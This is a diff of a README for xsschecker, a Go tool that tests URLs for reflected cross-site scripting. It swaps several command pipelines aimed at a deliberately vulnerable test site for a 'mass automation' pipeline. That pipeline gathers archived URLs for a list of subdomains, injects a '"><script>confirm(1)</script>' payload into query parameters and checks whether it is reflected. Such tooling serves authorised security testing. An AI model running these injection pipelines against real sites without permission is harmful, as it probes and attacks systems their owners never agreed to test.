@@ -10,41 +10,36 @@
 <h3 align="center">xsschecker tool checking reflected endpoints finding possible xss vulnerable endpoints.</h3>
 
 ## Install
-```bash
+```
 go install github.com/rix4uni/xsschecker@latest
 ```
 or
 
-```bash
+```
 git clone https://github.com/rix4uni/xsschecker.git && cd xsschecker && go build xsschecker.go && mv xsschecker /usr/bin/
 ```
-## Reflected XSS
-```bash
-echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | qsreplace '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2"
+## Usage
+```
+go run xsschecker.go -h
+Usage: xsschecker [OPTIONS]
 
-echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" --proxy "http://yourproxy"
-
-echo "http://testphp.vulnweb.com" | waybackurls | nilo | anew | gf xss | qsreplace -a | bhedak '"><svg onload=confirm(1)>' | airixss -p "confirm(1)" -H "Header1: Value1;Header2: value2" -x "http://yourproxy"
-
-echo "http://testphp.vulnweb.com" | waybackurls | anew | gf xss | uro | nilo | qsreplace '"><svg onload=confirm(1)>' | airixss -hm -s -c 5
+Options:
+  -match string
+        The string to match against the domain response. (required)
+  -vuln
+        If set, only vulnerable URLs will be printed.
 ```
 
-urldedupe bhedak
-```bash
-waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | xsschecker
+## Reflected XSS Mass Automation
+```
+cat subs.txt | waybackurls >> waybackurls-urls.txt
+cat subs.txt | gau >> gau-urls.txt
+cat waybackurls-urls.txt gau-urls.txt | anew -q urls.txt
+
+cat urls.txt | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
 ```
 
-GF
-```bash
-waybackurls testphp.vulnweb.com | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | xsschecker
+## Reflected XSS Oneliner
 ```
-
-Kxss
-```bash
-waybackurls testphp.vulnweb.com | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
-```
-
-gospider
-```bash
-gospider -s "http://testphp.vulnweb.com" -c 10 -d 5 -t 100 --other-source | tr " " "\n" | kxss | grep "=" | sed 's/URL: //' | sed 's/=.*/=/' | uro | qsreplace '"><svg onload=confirm(1)>' | xsschecker
+echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>'
 ```
